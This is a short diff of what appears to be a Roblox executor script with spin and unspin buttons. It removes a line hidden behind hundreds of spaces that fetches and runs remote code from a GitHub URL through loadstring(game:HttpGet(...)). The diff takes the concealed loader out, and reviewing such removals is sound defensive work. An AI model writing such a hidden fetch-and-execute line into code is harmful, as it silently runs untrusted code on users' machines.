@@ -2054,8 +2054,6 @@ Callback = function(getSpinSpeed)
     end
 end,})
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if getgenv().css_digital then warn("Already Ran!") else loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/bruhlolw/refs/heads/main/prote'))() wait(0.1) getgenv().css_digital = true end
-
 local UnspinNow = Tab2:CreateButton({
 Name = "Unspin",
 Callback = function()
